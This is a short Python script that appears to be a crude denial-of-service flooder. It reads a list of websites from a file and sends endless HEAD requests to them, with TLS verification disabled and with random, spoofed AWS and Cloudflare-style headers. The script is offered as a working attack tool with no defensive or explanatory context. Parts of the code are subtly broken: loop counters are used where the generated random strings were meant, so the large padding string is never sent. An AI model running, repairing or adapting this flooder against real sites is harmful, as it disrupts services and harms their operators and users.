import requests,random

data_range = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
data_range2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while True:
    file_website_list = open("website.txt",'r')
    file_website_list = file_website_list
    for i in file_website_list:
        try:
            data_buff =""
            for buffer in range(16):
                data_buff += random.choice((data_range))
            
            data_buff2 =""
            for buffer2 in range(32):
                data_buff2 += random.choice((data_range))
            
            data_buff3 =""
            for buffer3 in range(74):
                data_buff3 += random.choice((data_range2))
            data_buff3 = f"{data_buff3}="

            data_buff4 =""
            for buffer4 in range(24):
                data_buff4 += random.choice((data_range))
            
            data_buff5 =""
            for buffer5 in range(65502):
                data_buff5 += random.choice((data_range2))

            i=i.strip()
            head = {
                "age":f"{random.randint(0,99999999999999999)}",
                "x-amz-server-side-encryption":"AES256,RSA2048,AES2048,RSA4089,AES65502,RSA65502",
                "x-xss-protection": "1; mode=block",
                "x-amz-id-2":f"{buffer3}",
                "x-amz-request-id":f"{data_buff}",
                "etag":f'"{data_buff2}"',
                "cf-cache-status":f"DYNAMIC",
                "range":"2048 * 4089 * 65502",
                "cf-ray":f"{data_buff4}-USA",
                "Accept-Encoding":f"{buffer5}",
            }
            req=requests.head(i,verify=False,headers=head)
            if req.status_code == 200:
                print(f"{i} SUCCESS TO CONNECT . . .")
            else:
                print(F"{i} CODE-{req.status_code} FAIL TO CONNECT . . .")
        except requests.exceptions.RequestException:
            print(f"{i} ERROR . . .")
            continue